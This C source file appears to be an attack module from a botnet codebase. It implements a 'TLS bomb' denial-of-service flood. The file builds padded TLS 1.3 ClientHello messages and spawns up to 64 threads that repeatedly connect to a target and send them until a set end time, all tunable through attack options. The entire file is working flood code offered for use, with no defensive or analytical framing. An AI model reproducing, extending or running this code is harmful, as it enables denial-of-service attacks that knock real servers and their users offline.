#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#ifndef ANDROID
#include <netinet/tcp.h>
#endif
#include <arpa/inet.h>
#include <poll.h>

#include "headers/includes.h"
#include "headers/tls_bomb.h"
#include "headers/attack.h"
#include "headers/x25519.h"
#include "headers/rand.h"
#include "headers/util.h"

#define TLSBOMB_THREADS 32

typedef struct {
    struct sockaddr_in dst;
    int pad_len;
    int hellos_per_conn;
    char sni[256];
    volatile int *counter;
} tlsbomb_ctx;

int tls_build_client_hello(uint8_t *buf, const char *sni, int pad_len,
                           uint8_t pub_out[32], uint8_t priv_out[32])
{
    uint8_t pub[32], priv[32];
    int off = 0;

    x25519_gen_keypair(pub, priv);

    buf[off++] = 0x16;
    buf[off++] = 0x03;
    buf[off++] = 0x01;
    {
        int rec_len_pos = off;
        off += 2;

        buf[off++] = 0x01;
        {
            int hs_len_pos = off;
            off += 3;

            buf[off++] = 0x03;
            buf[off++] = 0x03;

            for (int i = 0; i < 32; i++)
                buf[off++] = rand_next() & 0xff;

            buf[off++] = 32;
            for (int i = 0; i < 32; i++)
                buf[off++] = rand_next() & 0xff;

            buf[off++] = 0x00;
            buf[off++] = 0x08;
            buf[off++] = 0x13;
            buf[off++] = 0x01;
            buf[off++] = 0x13;
            buf[off++] = 0x02;
            buf[off++] = 0x13;
            buf[off++] = 0x03;
            buf[off++] = 0x00;
            buf[off++] = 0xff;

            buf[off++] = 0x01;
            buf[off++] = 0x00;

            {
                int ext_len_pos = off;
                off += 2;
                int ext_start = off;

                if (sni && sni[0])
                {
                    int sni_len = util_strlen(sni);
                    buf[off++] = 0x00;
                    buf[off++] = 0x00;
                    buf[off++] = ((sni_len + 5) >> 8) & 0xff;
                    buf[off++] = (sni_len + 5) & 0xff;
                    buf[off++] = ((sni_len + 3) >> 8) & 0xff;
                    buf[off++] = (sni_len + 3) & 0xff;
                    buf[off++] = 0x00;
                    buf[off++] = (sni_len >> 8) & 0xff;
                    buf[off++] = sni_len & 0xff;
                    util_memcpy(buf + off, sni, sni_len);
                    off += sni_len;
                }

                buf[off++] = 0x00;
                buf[off++] = 0x2b;
                buf[off++] = 0x00;
                buf[off++] = 0x03;
                buf[off++] = 0x02;
                buf[off++] = 0x03;
                buf[off++] = 0x04;

                buf[off++] = 0x00;
                buf[off++] = 0x0a;
                buf[off++] = 0x00;
                buf[off++] = 0x04;
                buf[off++] = 0x00;
                buf[off++] = 0x02;
                buf[off++] = 0x00;
                buf[off++] = 0x1d;

                buf[off++] = 0x00;
                buf[off++] = 0x33;
                buf[off++] = 0x00;
                buf[off++] = 0x26;
                buf[off++] = 0x00;
                buf[off++] = 0x24;
                buf[off++] = 0x00;
                buf[off++] = 0x1d;
                buf[off++] = 0x00;
                buf[off++] = 0x20;
                util_memcpy(buf + off, pub, 32);
                off += 32;

                if (pad_len > 0)
                {
                    buf[off++] = 0x00;
                    buf[off++] = 0x15;
                    buf[off++] = (pad_len >> 8) & 0xff;
                    buf[off++] = pad_len & 0xff;
                    util_zero(buf + off, pad_len);
                    off += pad_len;
                }

                {
                    int ext_len = off - ext_start;
                    buf[ext_len_pos] = (ext_len >> 8) & 0xff;
                    buf[ext_len_pos + 1] = ext_len & 0xff;
                }

                {
                    int hs_len = off - hs_len_pos - 3;
                    buf[hs_len_pos] = (hs_len >> 16) & 0xff;
                    buf[hs_len_pos + 1] = (hs_len >> 8) & 0xff;
                    buf[hs_len_pos + 2] = hs_len & 0xff;
                }
            }
        }

        {
            int rec_len = off - rec_len_pos - 2;
            buf[rec_len_pos] = (rec_len >> 8) & 0xff;
            buf[rec_len_pos + 1] = rec_len & 0xff;
        }
    }

    if (pub_out)
        util_memcpy(pub_out, pub, 32);
    if (priv_out)
        util_memcpy(priv_out, priv, 32);

    return off;
}

static void *tlsbomb_thread(void *arg)
{
    tlsbomb_ctx *ctx = (tlsbomb_ctx *)arg;
    uint8_t buf[16384];

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
    {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0)
            continue;

        fcntl(fd, F_SETFL, O_NONBLOCK);
        connect(fd, (struct sockaddr *)&ctx->dst, sizeof(ctx->dst));

        struct pollfd pfd = {fd, POLLOUT, 0};
        if (poll(&pfd, 1, 1000) <= 0)
        {
            close(fd);
            continue;
        }

        {
            int err = 0;
            socklen_t el = sizeof(err);
            if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el) < 0 || err)
            {
                close(fd);
                continue;
            }
        }

        {
            int one = 1;
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
        }

        for (int i = 0; i < ctx->hellos_per_conn; i++)
        {
            int len = tls_build_client_hello(buf, ctx->sni, ctx->pad_len, NULL, NULL);
            if (send(fd, buf, len, MSG_NOSIGNAL) <= 0)
                break;
            if (ctx->counter)
                (*ctx->counter)++;
        }

        close(fd);
    }
    return NULL;
}

void attack_tls_bomb(uint8_t targs_len, struct attack_target *targs,
                     uint8_t opts_len, struct attack_option *opts)
{
    int dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 443);
    char *sni = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int pad_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 8192);
    int hellos = attack_get_opt_int(opts_len, opts, ATK_OPT_AGGRESSIVE, 16);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, TLSBOMB_THREADS);
    pthread_t t[64];
    tlsbomb_ctx ctx;
    volatile int counter = 0;
    int i;

    if (targs_len == 0)
        return;

    if (pad_len < 0)
        pad_len = 0;
    if (pad_len > 14000)
        pad_len = 14000;
    if (hellos < 1)
        hellos = 1;
    if (hellos > 64)
        hellos = 64;
    if (threads < 1)
        threads = 1;
    if (threads > 64)
        threads = 64;

    util_zero(&ctx, sizeof(ctx));
    ctx.dst.sin_family = AF_INET;
    ctx.dst.sin_port = htons(dport);
    ctx.dst.sin_addr.s_addr = targs[0].addr;
    ctx.pad_len = pad_len;
    ctx.hellos_per_conn = hellos;
    ctx.counter = &counter;
    if (sni)
        util_strcpy(ctx.sni, sni);

    for (i = 0; i < threads; i++)
        pthread_create(&t[i], NULL, tlsbomb_thread, &ctx);

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
        sleep(1);

    for (i = 0; i < threads; i++)
        pthread_join(t[i], NULL);
}
